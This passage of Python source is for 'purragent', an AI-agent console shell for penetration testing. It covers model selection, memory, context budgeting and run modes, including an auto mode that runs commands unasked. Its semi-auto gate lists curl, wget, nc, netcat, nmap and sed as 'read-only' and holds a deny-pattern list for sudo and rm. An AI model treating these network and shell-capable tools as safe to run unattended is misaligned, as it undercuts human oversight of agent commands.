#!/usr/bin/env python3
"""
purragent.py — interactive console agent shell for PurrSh3ll.

Claude-Code-style REPL:
  • framed welcome box: name + version on the border, "Welcome back Hacker!",
    the violet circuit-paw logo, the attached-model line, and a commands column
  • arrow-key slash-command menu (prompt_toolkit completer dropdown)
  • bottom status line, under the input, showing the attached model + provider
  • no model is auto-selected — the user types /model to choose one (arrow keys),
    sourced from AI Settings > API Providers

Typed (non-slash) input is sent to the selected model. Model/provider/key
plumbing is reused from psai.py so purragent shares the app's profiles.
"""

import argparse
import contextlib
import functools
import getpass
import io
import ipaddress
import json
import os
import platform
import re
import shlex
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time

# Importing readline gives every plain input() prompt (the /hack step-1 IP, step-2
# ports, the [y/N] confirms, target edits) full line editing — backspace, arrow keys,
# and history — instead of raw cooked-mode entry. Guarded: not present on all platforms.
try:
    import readline  # noqa: F401
except ImportError:
    pass

# Reuse psai's provider/profile/LLM plumbing. psai lives in the same directory;
# importing it is side-effect-free (its main() is guarded by __main__).
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import psai  # noqa: E402
import mcp_client  # noqa: E402  — dependency-free MCP (Model Context Protocol) client
import tool_retriever  # noqa: E402  — client-side RAG for semantic tool discovery
import purragent_db  # noqa: E402  — hacking-mode engagement / target intake store

import urllib.request  # noqa: E402  — the tool-use loop's streaming chat call
import urllib.error     # noqa: E402  — HTTPError handling for the stream

from prompt_toolkit import PromptSession                       # noqa: E402
from prompt_toolkit.application import Application, get_app    # noqa: E402
from prompt_toolkit.completion import Completer, Completion    # noqa: E402
from prompt_toolkit.filters import completion_is_selected, has_completions  # noqa: E402
from prompt_toolkit.formatted_text import ANSI, HTML           # noqa: E402
from prompt_toolkit.history import InMemoryHistory             # noqa: E402
from prompt_toolkit.key_binding import KeyBindings             # noqa: E402
from prompt_toolkit.layout import Layout, Window               # noqa: E402
from prompt_toolkit.layout.controls import FormattedTextControl  # noqa: E402
from prompt_toolkit.styles import Style                        # noqa: E402

from rich.console import Console, Group                        # noqa: E402
from rich.panel import Panel                                   # noqa: E402
from rich.table import Table                                   # noqa: E402
from rich.text import Text                                     # noqa: E402
from rich import box                                           # noqa: E402

TOOL_NAME = "purragent"
VERSION   = "1.0.0"
DEFAULT_GREETING = "Hacker"      # "Welcome back <greeting>!" — change with /greeting

_NO_MODEL = object()             # picker sentinel: detach the model (debugging)
VIOLET    = "#b46cff"     # single-colour fill for the paw logo + accents
ORANGE    = "#d19a66"     # debug-only accents (e.g. /context budget diagnostics)

# Brand mark: purragent's logo, pre-rendered to a small monochrome glyph
# silhouette (regenerate with `scripts/render_purragent_logo.py`). purragent
# paints it VIOLET at render time. The _blink (eyes closed) and _squint (eyes
# narrowed) variants let the welcome box animate the cat's eyes on the first prompt.
_HERE = os.path.dirname(os.path.abspath(__file__))
LOGO_PATHS = {
    "open":   os.path.join(_HERE, "purragent_logo.ans"),
    "blink":  os.path.join(_HERE, "purragent_logo_blink.ans"),
    "squint": os.path.join(_HERE, "purragent_logo_squint.ans"),
}
FALLBACK_PAW = "  _   _\n (_) (_)\n(_)   (_)\n  (___)"

# Eye animation (seconds) while the welcome banner is on screen (first prompt):
# a quick blink often, plus a slower squint now and then. The refresh rate is
# high so a repaint reliably lands inside the short windows — it's cheap because
# prompt_toolkit only redraws changed cells, and nothing changes when idle.
BLINK_CYCLE   = 4.5
BLINK_LEN     = 0.16
SQUINT_CYCLE  = 11.0
SQUINT_LEN    = 0.9
BLINK_REFRESH = 0.05

# Slash commands offered in the / dropdown and listed by /help.
SLASH = [
    ("/model",    "switch the attached model (or detach)"),
    ("/mode",     "set how the agent runs (auto / semi-auto / confirm / plan)"),
    ("/mcp",      "manage MCP servers"),
    ("/doctor",   "check which hacktools need a program installed"),
    ("/hack",     "run the auto-hacking loop against a target"),
    ("/target",   "show the recorded hacking-mode target database"),
    ("/memory",   "view or forget what the model has remembered"),
    ("/upgrade",  "re-launch purragent as root (sudo)"),
    ("/debug",    "toggle showing the raw request sent to the model"),
    ("/greeting", "set the welcome name (e.g. /greeting Neo)"),
    ("/context",  "show how much of the context window is used"),
    ("/setcontext", "set the max context this session (e.g. 32k, or 'default' to reset)"),
    ("/help",     "show commands and usage"),
    ("/clear",    "clear the conversation"),
    ("/exit",     "quit purragent"),
]

# Second-level completions offered after "<command> " (e.g. "/mcp add").
SLASH_SUBCOMMANDS = {
    "/mcp": [
        ("add",     "add a connect-only MCP server by URL"),
        ("enable",  "enable a server (pull its tools)"),
        ("disable", "disable a server"),
        ("remove",  "remove an MCP server (and all its data)"),
    ],
    "/memory": [
        ("delete",  "forget an entry by its number"),
        ("clear",   "forget everything"),
    ],
}

# /mcp subcommands whose third slot is an existing server name.
_MCP_NAME_SUBS = ("remove", "rm", "delete", "enable", "disable")

# Agent run modes (Claude-Code-style). Wired into the tool loop via _needs_confirm
# and query_model_with_tools(mode=…): plan disables tools, confirm/semi-auto gate
# execution, auto runs freely.
DEFAULT_MODE = "auto"
AGENT_MODES = [
    ("auto",      "run commands automatically, without asking"),
    ("semi-auto", "ask for permission only for risky actions"),
    ("confirm",   "ask before running each command"),
    ("plan",      "plan only — describe actions, don't execute"),
]

# Commands shown in the welcome box's right column (the essentials).
BANNER_COMMANDS = [
    ("/model",   "switch model"),
    ("/help",    "show help"),
    ("/mcp",     "MCP servers"),
    ("/upgrade", "run as root"),
    ("/hack",    "hack a target"),
]

# Light default persona; a profile's own custom_system is appended after it.
PURRAGENT_SYSTEM = (
    "You are purragent, a console assistant for authorized penetration testing "
    "and security research inside PurrSh3ll. Be concise and practical. "
    "Basic host facts are given in the <env> block below — use them directly and "
    "do not call tools to discover what is already there (user, home, OS, cwd, date)."
)

console = Console()


@contextlib.contextmanager
def _alt_screen():
    """Run a block on the terminal's alternate screen buffer, then restore the
    previous screen — so overlays (picker, /help) leave no clutter in scrollback.
    Explicit escapes are used because nested prompt_toolkit apps don't switch to
    the alternate buffer on their own."""
    sys.stdout.write("\x1b[?1049h\x1b[H")
    sys.stdout.flush()
    try:
        yield
    finally:
        sys.stdout.write("\x1b[?1049l")
        sys.stdout.flush()


# ── State (which profile purragent is attached to) ─────────────────────────────
# Kept separate from api_profiles.json's "active" field so choosing a model here
# does not silently change the profile used by the GUI / psai.

def _state_path(base_dir: str) -> str:
    return os.path.join(base_dir, "appdata", "purragent_state.json")


def _load_state(base_dir: str) -> dict:
    try:
        with open(_state_path(base_dir), encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _save_state(base_dir: str, **updates) -> None:
    """Merge updates into the saved state (keeps other keys intact)."""
    state = _load_state(base_dir)
    state.update(updates)
    try:
        with open(_state_path(base_dir), "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2)
    except Exception:
        pass  # non-fatal: selection just won't persist to next launch


# ── User memory (normal mode) ──────────────────────────────────────────────────
# Things the user explicitly asks the model to remember — a standing 'instruction'
# (always injected into the system prompt) or a 'fact' to keep. Persisted in the
# state file (survives sessions), injected into context each turn; written only when
# the model calls the save_memory tool.
MEMORY_KINDS = ("instruction", "fact")


def _load_memories(base_dir: str) -> list:
    mems = _load_state(base_dir).get("memories")
    return mems if isinstance(mems, list) else []


def _add_memory(base_dir: str, text: str, kind: str) -> bool:
    """Store one memory, deduped on text (case-insensitive). Returns True if added."""
    from datetime import datetime, timezone
    text = (text or "").strip()
    if not text:
        return False
    kind = kind if kind in MEMORY_KINDS else "fact"
    mems = _load_memories(base_dir)
    if any((m.get("text") or "").strip().lower() == text.lower() for m in mems):
        return False
    mems.append({"text": text, "kind": kind,
                 "created": datetime.now(timezone.utc).isoformat(timespec="seconds")})
    _save_state(base_dir, memories=mems)
    return True


def _delete_memory(base_dir: str, text: str) -> list:
    """Remove stored memories matching `text` (case-insensitive, either direction, so the
    model can pass the exact text it sees or a distinctive part). Returns removed texts.
    Since the stored memories are injected into context, the model quotes them accurately."""
    q = (text or "").strip().lower()
    if not q:
        return []
    kept, removed = [], []
    for m in _load_memories(base_dir):
        t = (m.get("text") or "").strip()
        tl = t.lower()
        if tl and (tl == q or q in tl or tl in q):
            removed.append(t)
        else:
            kept.append(m)
    if removed:
        _save_state(base_dir, memories=kept)
    return removed


def _memory_block(base_dir: str) -> str:
    """Remembered instructions + facts as a system-prompt block; empty when none."""
    mems = _load_memories(base_dir)
    if not mems:
        return ""
    instr = [m["text"] for m in mems if m.get("kind") == "instruction"]
    facts = [m["text"] for m in mems if m.get("kind") != "instruction"]
    parts = []
    if instr:
        parts.append("USER INSTRUCTIONS (always follow):\n"
                     + "\n".join(f"- {t}" for t in instr))
    if facts:
        parts.append("REMEMBERED (facts the user asked you to keep):\n"
                     + "\n".join(f"- {t}" for t in facts))
    return "\n\n".join(parts)


def _delete_memory_index(base_dir: str, idx: int):
    """Forget the memory at 1-based position `idx` (as shown by /memory). Returns its
    text, or None if out of range."""
    mems = _load_memories(base_dir)
    if idx < 1 or idx > len(mems):
        return None
    removed = mems.pop(idx - 1)
    _save_state(base_dir, memories=mems)
    return removed.get("text")


def _clear_memories(base_dir: str) -> int:
    """Forget everything; returns how many items were cleared."""
    n = len(_load_memories(base_dir))
    _save_state(base_dir, memories=[])
    return n


def _memory_view(base_dir: str) -> None:
    """/memory — the numbered list of remembered instructions + facts."""
    mems = _load_memories(base_dir)
    console.print(Text("purragent — memory", style=f"bold {VIOLET}"))
    if not mems:
        console.print(Text("  nothing remembered yet — ask the model to remember "
                           "something and it saves it here.", style="bright_black"))
        return
    for i, m in enumerate(mems, 1):
        kind = m.get("kind", "fact")
        line = Text(f"  {i}. ", style="bright_black")
        line.append(f"[{kind}] ",
                    style=("cyan" if kind == "instruction" else "green"))
        line.append(m.get("text", ""))
        console.print(line)
    console.print(Text("  /memory delete <n> · /memory clear", style="bright_black"))


# ── Profiles ───────────────────────────────────────────────────────────────────

def _profiles(config: dict) -> list:
    return config.get("api_providers", {}).get("profiles", []) or []


def _find_profile(config: dict, name: str) -> dict | None:
    for p in _profiles(config):
        if p.get("name") == name:
            return p
    return None


def _model_short(profile: dict) -> str:
    """Human-friendly model name for the status line (basename after last '/')."""
    m = profile.get("model", "") or "?"
    if m.lower().startswith("models/"):
        m = m[7:]
    return m.rsplit("/", 1)[-1]


def _is_root() -> bool:
    """True if the process is running with root privileges."""
    try:
        return os.geteuid() == 0
    except AttributeError:      # non-POSIX
        return False


def _model_has_tools(profile: dict, base_dir: str) -> bool:
    """Whether this model supports function calling per the app's registry
    (model_ctx_registry.json) — the capability itself, independent of the profile's
    own tools_user_override. Reuses psai's registry logic with the override stripped."""
    p = dict(profile)
    p.pop("tools_user_override", None)
    try:
        return bool(psai._tools_enabled(p, base_dir))
    except Exception:
        return False


@functools.lru_cache(maxsize=1)
def _load_registry(base_dir: str) -> dict:
    """Cached model_ctx_registry.json (read once — the toolbar checks caps often)."""
    try:
        with open(os.path.join(base_dir, "appdata", "model_ctx_registry.json"),
                  encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _model_capability(profile: dict, base_dir: str, cap: str) -> bool:
    """Whether the model supports `cap` ('vision' or 'audio'). Mirrors the tools
    logic: a per-profile <cap>_user_override wins; otherwise the provider's list
    of capable models in the registry decides."""
    override = profile.get(f"{cap}_user_override")
    if override is not None:
        return bool(override)
    model = profile.get("model", "")
    if model.lower().startswith("models/"):     # Gemini prefix
        model = model[7:]
    if ":" in model:                            # OpenRouter :free / :variant suffix
        model = model.split(":")[0]
    section = _load_registry(base_dir).get(profile.get("provider", "").lower(), {})
    return model.lower() in [m.lower() for m in (section.get(cap) or [])]


# ── Context window (size the model advertises + live usage estimate) ────────────

# Local-host providers serve their own num_ctx (Ollama's real default ~4096);
# cloud providers get a large modern window. Mirrors core/controller.py so the
# value here matches the GUI's live CTX bar for a model missing from the registry.
_LOCAL_CTX_PROVIDERS = frozenset({"ollama", "llamacpp", "lmstudio", "jan", "koboldcpp"})


def _model_context(profile: dict, base_dir: str):
    """The model's context window (tokens), resolved exactly like the rest of the
    app: explicit profile `context_tokens` override → model_ctx_registry.json
    (exact then prefix match, then provider default via psai) → a provider-based
    fallback (local host 4096, cloud 200k). Only None when there is no profile,
    so — like the GUI — an unknown model still shows a sensible number."""
    if not profile:
        return None
    try:
        val = psai._get_ctx_window(profile, base_dir)
    except Exception:
        val = None
    if val:
        return val
    provider = (profile.get("provider", "") or "").lower()
    return 4096 if provider in _LOCAL_CTX_PROVIDERS else 200_000


def _effective_max_context(ctx: dict, base_dir: str):
    """Session override if set, else the model's registry context size."""
    return ctx.get("max_context") or _model_context(ctx.get("profile"), base_dir)


def _fmt_ctx(n) -> str:
    if not n:
        return "?"
    return f"{round(n / 1000)}k" if n >= 1000 else str(n)


def _parse_ctx_number(s: str):
    """Parse '32000', '32k', '128k', '1m' → int tokens, or None if invalid."""
    s = (s or "").strip().lower().replace(",", "").replace("_", "")
    if not s:
        return None
    mult = 1
    if s.endswith("k"):
        mult, s = 1000, s[:-1]
    elif s.endswith("m"):
        mult, s = 1_000_000, s[:-1]
    try:
        val = int(float(s) * mult)
    except ValueError:
        return None
    return val if val > 0 else None


def _estimate_context_tokens(profile: dict, base_dir: str, history: list,
                             mcp, use_tools: bool) -> int:
    """Rough token estimate (~4 chars/token) of what a prompt now sends: the
    system prompt (+ <env>, + discovery guide & tool catalog when tools are on),
    the whole conversation history and the `tools` request field. An estimate, not
    an exact tokenizer — used to block a request that would blow the window."""
    parts = [PURRAGENT_SYSTEM, _env_block()]
    tools_tok = 0
    if use_tools and mcp is not None:
        try:
            all_tools = mcp.all_tools()
        except Exception:
            all_tools = []
        if all_tools:
            parts += [_DISCOVERY_GUIDE, _catalog_block(all_tools)]
            tools_tok = TOOLS_RESERVATION_TOKENS   # the `tools` request field
    custom = (profile.get("custom_system", "") or "").strip() if profile else ""
    if custom:
        parts.append(custom)
    for m in history:
        c = m.get("content")
        if isinstance(c, str) and c:
            parts.append(c)
    total_chars = sum(len(p) for p in parts)
    return total_chars // 4 + tools_tok


def _fixed_header_parts(profile: dict, base_dir: str, mcp, mode: str) -> list:
    """The fixed per-prompt overhead as [(label, chars)] — system prompt+env, tool
    catalog, custom instructions, saved /memory, and the tools-field reservation. Shared
    by /context (display) and the conversation-budget math so they can't drift."""
    planning = (mode == "plan")
    use_tools = (not planning) and _supports_tool_loop(profile) \
        and _model_has_tools(profile, base_dir)
    sys_chars = len(PURRAGENT_SYSTEM) + len(_env_block())
    if planning:
        sys_chars += len(PLAN_MODE_NOTE)
    cat_chars = tools_chars = 0
    if use_tools and mcp is not None:
        try:
            all_tools = [t for t in mcp.all_tools() if _tool_available(t)]
        except Exception:                              # noqa: BLE001
            all_tools = []
        if all_tools:
            cat_chars = len(_DISCOVERY_GUIDE) + len(_catalog_block(all_tools))
            tools_chars = TOOLS_RESERVATION_TOKENS * 4
    return [
        ("system prompt&env",     sys_chars),
        ("tool catalog",          cat_chars),
        ("custom instructions",   len((profile.get("custom_system", "") or "").strip())),
        ("user memory (/memory)", len(_memory_block(base_dir))),
        ("mcp tools (reserved)",  tools_chars),
    ]


def _conv_budget(profile: dict, base_dir: str, ctx: dict, mcp, mode: str):
    """(recent_budget_chars, summ_cap_chars): the verbatim window and the summary cap,
    using the exact percentage split /context shows. None when the model window is
    unknown (→ no enforcement). Recent verbatim = pool − summary cap (− findings floor)."""
    maxc = _effective_max_context(ctx, base_dir)
    if not maxc:
        return None
    budget_tok = max(0, min(int(maxc * FILL_FRAC), maxc - OUTPUT_FLOOR))
    fixed_chars = sum(c for _, c in _fixed_header_parts(profile, base_dir, mcp, mode))
    memory_chars = MEMORY_LOOKUP_TOKENS * 4
    pool = max(0, budget_tok * 4 - fixed_chars - memory_chars)
    findings_chars = min(max(0, FINDINGS_FLOOR_TOKENS * 4), int(FINDINGS_CAP_FRAC * pool))
    avail = max(0, pool - findings_chars)
    summ_cap = int(SUMMARIZED_CAP_FRAC * pool)
    return max(0, avail - summ_cap), summ_cap


def _context_view(ctx: dict, base_dir: str, history: list, mcp,
                  mode: str = "auto", debug: bool = False) -> None:
    """Alt-screen view of context-window usage, split into two groups: the fixed
    overhead sent on every prompt (system prompt, catalog, custom instructions
    and the tools-field reservation) and the conversation that grows. Opened by
    /context, dismissed with q/Esc (like the /mcp view). In plan mode no tools or
    catalog are sent, so those two rows show 0."""
    p = ctx.get("profile")
    if not p:
        console.print("  [yellow]No model attached.[/yellow] "
                      "[dim]/model to choose one[/dim]")
        return
    fixed = _fixed_header_parts(p, base_dir, mcp, mode)
    hist_chars = sum(len(m.get("content")) for m in history
                     if isinstance(m.get("content"), str))
    fixed_chars = sum(c for _, c in fixed)
    maxc = _effective_max_context(ctx, base_dir)

    # ── Budget: never fill the whole window (quality + room to generate) ───────
    # budget = min(FILL_FRAC·window, window − OUTPUT_FLOOR): FILL_FRAC governs big
    # windows, the absolute output floor governs tiny ones. Everything below is
    # apportioned inside this budget; HEADER is a fixed cost subtracted first.
    if maxc:
        budget_tok = max(0, min(int(maxc * FILL_FRAC), maxc - OUTPUT_FLOOR))
    else:
        budget_tok = None

    # CONVERSATION splits three ways: recent turns kept verbatim, older turns that
    # overflow (destined to be summarised), and a fixed reservation for memory
    # lookup (RAG recall of older/other-session conversation). Nothing is actually
    # summarised or recalled yet — for now this only accounts the tokens.
    memory_chars = MEMORY_LOOKUP_TOKENS * 4
    findings_floor_chars = FINDINGS_FLOOR_TOKENS * 4

    # Elastic pool = budget − HEADER − memory-lookup reservation. Findings and the
    # live conversation share it via cap/floor/borrowing (see the constants block).
    if budget_tok is not None:
        pool = max(0, budget_tok * 4 - fixed_chars - memory_chars)
    else:
        pool = None

    # FINDINGS: reservation (floor) held, capped once its DB is wired; 0 demand now.
    findings_demand = 0
    if pool is not None:
        findings_cap = int(FINDINGS_CAP_FRAC * pool)
        findings_chars = min(max(findings_demand, findings_floor_chars), findings_cap)
    else:
        findings_chars = findings_demand

    # recent conversation = the verbatim (trimmed) history; summarized = the actual
    # running summary (older turns condensed by _maybe_summarize). They never exceed the
    # pool because _maybe_summarize keeps recent within pool−summary_cap and caps the
    # summary at summary_cap.
    recent_chars = hist_chars
    summarized_chars = len((ctx.get("summary") or ""))
    conversation_chars = recent_chars + summarized_chars + memory_chars

    total_chars = fixed_chars + conversation_chars + findings_chars
    used = total_chars // 4

    # Share of the whole model context window (falls back to share of what's
    # currently used when the model's max is unknown).
    denom = maxc or used

    def share(chars: int) -> str:
        return f"{(chars // 4) * 100 / denom:.1f}%" if denom else "0%"

    parts = [Text(f"Context — {_model_short(p)}", style=f"bold {VIOLET}"), Text("")]
    if maxc:
        pct = min(100, round(used * 100 / maxc))
        filled = min(32, round(pct * 32 / 100))
        col = "green" if pct < 75 else "yellow" if pct < 90 else "red"
        head = Text()
        head.append(f"~{used:,}", style="bold")
        head.append(f" / {maxc:,} tokens   ")
        head.append(f"({pct}%)", style="bright_black")
        if ctx.get("max_context"):
            head.append("   session override", style="yellow")
        parts += [head, Text("█" * filled + "░" * (32 - filled), style=col)]
    else:
        parts.append(Text(f"~{used:,} tokens used  (model max unknown — "
                          "set it with /setcontext <n>)"))
    parts.append(Text(""))

    tbl = Table(box=box.HORIZONTALS, show_header=True,
                header_style="bright_black", pad_edge=False, expand=False)
    tbl.add_column("")
    tbl.add_column("tokens", justify="right")
    tbl.add_column("share", justify="right")

    def item(label: str, chars: int) -> None:
        tbl.add_row(Text(f"  {label}", style="bright_black"),
                    Text(f"~{chars // 4:,}", style="bright_black"),
                    Text(share(chars), style="bright_black"))

    tbl.add_row(Text("HEADER", style=f"bold {VIOLET}"),
                Text(f"~{fixed_chars // 4:,}", style="bold"),
                Text(share(fixed_chars), style="bold"))
    for label, chars in fixed:
        item(label, chars)
    tbl.add_section()
    tbl.add_row(Text("CONVERSATION", style=f"bold {VIOLET}"),
                Text(f"~{conversation_chars // 4:,}", style="bold"),
                Text(share(conversation_chars), style="bold"))
    item("recent conversation", recent_chars)
    item("summarized conversation", summarized_chars)
    item("memory lookup (reserved)", memory_chars)
    tbl.add_section()
    tbl.add_row(Text("FINDINGS", style=f"bold {VIOLET}"),
                Text(f"~{findings_chars // 4:,}", style="bold"),
                Text(share(findings_chars), style="bold"))
    parts.append(tbl)

    # ── /debug: show how the budget is apportioned (caps, floors, borrowing) ───
    if debug:
        parts += [Text(""),
                  Text("budget diagnostics", style=f"bold {ORANGE}"),
                  Text("")]
        if budget_tok is None:
            parts.append(Text("  model window unknown — set it with /setcontext "
                              "<n> to see the budget split", style=ORANGE))
        else:
            pool_tok = pool // 4
            lines = [
                ("window",          f"{maxc:,}",             ""),
                ("fill fraction",   f"{int(maxc*FILL_FRAC):,}", f"{FILL_FRAC:.0%} of window"),
                ("output reserve",  f"{OUTPUT_FLOOR:,}",     "user prompt + model output"),
                ("budget",          f"{budget_tok:,}",       ""),
                ("− header",        f"{fixed_chars//4:,}",   ""),
                ("− memory lookup", f"{memory_chars//4:,}",  ""),
                ("= elastic pool",  f"{pool_tok:,}",         ""),
            ]
            lt = Table(box=None, show_header=False, pad_edge=False, expand=False)
            lt.add_column("")                      # label
            lt.add_column("", justify="right")     # tokens
            lt.add_column("")                      # unit + note
            for k, v, note in lines:
                style = f"bold {ORANGE}" if k in ("budget", "= elastic pool") else ORANGE
                unit = "tok" + (f"   {note}" if note else "")
                lt.add_row(Text(f"  {k}", style=style),
                           Text(v, style=style),
                           Text(f" {unit}", style=style))
            parts.append(lt)

            # per-section cap / floor / current use / borrowing against the pool
            summ_reserve   = int(SUMMARIZED_CAP_FRAC * pool)
            recent_base    = max(0, pool - summ_reserve - findings_floor_chars)
            borrowed       = max(0, recent_chars - recent_base)
            def pct_of_pool(chars: int) -> str:
                return f"{chars*100/pool:.0f}%" if pool else "—"
            dt = Table(box=box.HORIZONTALS, show_header=True,
                       header_style=ORANGE, pad_edge=False, expand=False)
            dt.add_column("section")
            dt.add_column("cap", justify="right")
            dt.add_column("min", justify="right")
            dt.add_column("now", justify="right")
            dt.add_column("borrow", justify="right")
            def drow(name, cap, mn, now_chars, borrow):
                dt.add_row(Text(f"  {name}", style=ORANGE),
                           Text(cap, style=ORANGE),
                           Text(mn, style=ORANGE),
                           Text(f"~{now_chars//4:,}", style=ORANGE),
                           Text(borrow, style=ORANGE))
            drow("recent conversation", "rest", "—", recent_chars,
                 f"+{borrowed//4:,}" if borrowed else "—")
            drow("summarized", f"{SUMMARIZED_CAP_FRAC:.0%}", "—", summarized_chars,
                 f"−{borrowed//4:,}" if borrowed else "—")
            drow("findings", f"{FINDINGS_CAP_FRAC:.0%}",
                 f"{FINDINGS_FLOOR_TOKENS:,}", findings_chars, "—")
            parts += [Text(""), dt,
                      Text("  cap/min = % of elastic pool · borrow = recent using "
                           "summary's idle space", style=ORANGE)]

    parts += [Text(""),
              Text("estimate (~4 chars/token) · q to return",
                   style="bright_black")]
    show_view(_render_ansi(Group(*parts)), hint="context usage · q to return")


# ── Inline arrow-key selector (Claude-Code-style) ──────────────────────────────

def select_option(title: str, options: list, start: int = 0):
    """Render an inline list; navigate with ↑/↓, choose with Enter, cancel with Esc.

    options: list of tuples. Each is (label, hint[, dim[, detail]]) where `dim`
    greys the row (e.g. unavailable) and `detail` is a line shown at the bottom
    only while that row is highlighted. Returns the chosen index, or None if
    cancelled.
    """
    if not options:
        return None
    idx = [max(0, min(start, len(options) - 1))]
    kb = KeyBindings()

    @kb.add("up")
    @kb.add("c-p")
    def _(_e):
        idx[0] = (idx[0] - 1) % len(options)

    @kb.add("down")
    @kb.add("c-n")
    def _(_e):
        idx[0] = (idx[0] + 1) % len(options)

    @kb.add("enter")
    def _(e):
        cur = options[idx[0]]
        disabled = cur[2] if len(cur) > 2 else False
        if disabled:
            return          # unavailable row (e.g. no function calling) — not selectable
        e.app.exit(result=idx[0])

    @kb.add("escape")
    @kb.add("c-c")
    def _(e):
        e.app.exit(result=None)

    def render():
        frags = [("class:title", f"  {title}\n\n")]
        for i, opt in enumerate(options):
            label, hint = opt[0], opt[1]
            disabled = opt[2] if len(opt) > 2 else False
            sel = i == idx[0]
            # Disabled rows stay red even when highlighted — they can't be chosen.
            style_cls = ("class:disabled" if disabled
                         else "class:sel" if sel else "class:opt")
            frags.append((style_cls, f"  {'❯' if sel else ' '} {label}"))
            if hint:
                frags.append(("class:hintdis" if disabled else "class:hint",
                              f"   {hint}"))
            frags.append(("", "\n"))
        # Detail line for the highlighted row (shown on hover), if it has one.
        cur = options[idx[0]]
        detail = cur[3] if len(cur) > 3 else ""
        cur_disabled = cur[2] if len(cur) > 2 else False
        if detail:
            frags.append(("class:detaildis" if cur_disabled else "class:detail",
                          f"\n  {detail}\n"))
        frags.append(("class:footer", "\n  ↑/↓ move · enter select · esc cancel"))
        return frags

    control = FormattedTextControl(render, show_cursor=False)
    style = Style.from_dict({
        "title":     "bold",
        "sel":       "bold #d75fff",
        "opt":       "",
        "disabled":  "#6a6a6a",
        "hint":      "#7f7f7f",
        "hintdis":   "#6a6a6a",
        "detail":    "#b46cff",
        "detaildis": "bold #ff5f5f",
        "footer":    "#7f7f7f italic",
    })
    app = Application(
        layout=Layout(Window(control, style="class:opt")),
        key_bindings=kb,
        style=style,
        full_screen=False,
        mouse_support=False,
    )
    # Runs on the alternate screen so the list vanishes on exit (no clutter).
    with _alt_screen():
        result = app.run()
    _drain_stdin()   # discard any stray wheel/arrow bytes so the next prompt is clean
    return result


def pick_model(config: dict, current_name: str | None, base_dir: str):
    """Show the profile picker.

    Models without function calling (per the registry) are greyed out; the
    highlighted row shows a note about its tool support. Returns the chosen
    profile dict, the _NO_MODEL sentinel (detach, for debugging), or None if
    the user cancelled.
    """
    profs = _profiles(config)
    if not profs:
        console.print(
            "  [yellow]No API profiles found.[/yellow] Add one in "
            "[bold]AI Settings ▸ API Providers[/bold] first.")
        return None
    # First entry detaches the model — handy for debugging the shell itself.
    options = [("No model", "detach — no LLM attached", False,
                "no LLM attached — chat is disabled (debugging)")]
    for p in profs:
        has_tools = _model_has_tools(p, base_dir)
        caps = [c for c in ("vision", "audio") if _model_capability(p, base_dir, c)]
        maxc = _model_context(p, base_dir)
        hint = f"{_model_short(p)} · {p.get('provider', '?')}"
        if maxc:                                    # context window per row
            hint += f" · {_fmt_ctx(maxc)} ctx"
        if caps:                                    # show multimodal support per row
            hint += " · " + " · ".join(caps)
        detail = ("✓ function calling supported"
                  if has_tools else
                  "✗ function calling not supported")
        if maxc:                                    # …and on the hover detail line
            detail += f"   ·   {maxc:,} token context"
        if caps:
            detail += "   ·   " + " · ".join(caps)
        # dim = greyed out when the model has no function calling
        options.append((p.get("name", "?"), hint, not has_tools, detail))
    start = next((i + 1 for i, p in enumerate(profs)
                  if p.get("name") == current_name), 0)
    choice = select_option("Select a model", options, start=start)
    if choice is None:
        return None
    if choice == 0:
        return _NO_MODEL
    return profs[choice - 1]


def pick_mode(current: str | None):
    """Pick the agent run mode. Returns the chosen mode name, or None if cancelled."""
    options = [(name, hint) for name, hint in AGENT_MODES]
    default_idx = next((i for i, (n, _) in enumerate(AGENT_MODES)
                        if n == DEFAULT_MODE), 0)
    start = next((i for i, (n, _) in enumerate(AGENT_MODES) if n == current),
                 default_idx)
    choice = select_option("Agent mode", options, start=start)
    if choice is None:
        return None
    return AGENT_MODES[choice][0]


# ── Run-mode gate: decides which tool calls need the user's OK ──────────────────
# plan  → tools are never offered (function calling off; the model just plans).
# auto  → run everything without asking.
# confirm → ask before every tool call.
# semi-auto → ask only for risky actions, decided by a deterministic, fail-closed
#   classifier: read-only tools/commands run automatically; anything that changes
#   local state — or that we can't positively classify as read-only — asks.

PLAN_MODE_NOTE = (
    "You are in PLAN mode. Do NOT call any tools. Produce a concise, numbered plan "
    "of the concrete steps and exact shell commands you would run to accomplish the "
    "task, each with a short rationale. The user will switch to another mode to "
    "actually execute."
)

# Tools that only read/inspect — safe to run unattended in semi-auto.
_READONLY_TOOLS = {"read_file", "list_dir", "grep", "find_files"}

# Base commands that only read/inspect the system (recon included). Anything NOT
# here makes run_command ask — the allowlist fails closed, so we never need to
# enumerate every dangerous command.
_READONLY_BINS = {
    "cd", "pushd", "popd", "true", "false", "test", "sleep", "seq",
    "ls", "dir", "cat", "head", "tail", "less", "more", "stat", "file", "wc",
    "sort", "uniq", "cut", "tr", "column", "tac", "nl", "fold", "rev",
    "grep", "egrep", "fgrep", "rg", "ag", "find", "locate", "which", "whereis",
    "type", "tree", "readlink", "realpath", "basename", "dirname",
    "echo", "printf", "pwd", "date", "cal", "uptime", "uname", "hostname",
    "whoami", "id", "groups", "who", "w", "last", "lscpu", "lsblk", "lsusb",
    "lspci", "env", "printenv", "du", "df", "free", "ps", "pstree", "top",
    "lsof", "vmstat", "ss", "netstat", "ip", "ifconfig", "route", "arp",
    "dig", "nslookup", "host", "whois", "ping", "traceroute", "tracepath",
    "mtr", "curl", "wget", "nmap", "masscan", "nc", "ncat", "netcat",
    "awk", "sed", "xxd", "hexdump", "od", "strings", "base64", "base32",
    "md5sum", "sha1sum", "sha256sum", "cksum", "git", "jq", "yq",
    "nikto", "whatweb", "gobuster", "feroxbuster", "dirb", "dirsearch", "ffuf",
    "wpscan", "enum4linux", "smbclient", "smbmap", "dnsrecon", "dnsenum",
    "sslscan", "sslyze", "testssl.sh", "nuclei", "httpx", "subfinder", "amass",
}

# High-signal dangerous constructs → confirm with a clear reason (the allowlist
# would already flag most of these, but an explicit reason is better UX).
_DANGER_PATTERNS = [
    (re.compile(r'(^|[\s;&|(])(sudo|doas|su)([\s;&|)]|$)'), "runs with elevated privileges (sudo)"),
    (re.compile(r'(^|[\s;&|(])(rm|rmdir|shred|unlink)([\s;&|)]|$)'), "deletes files"),
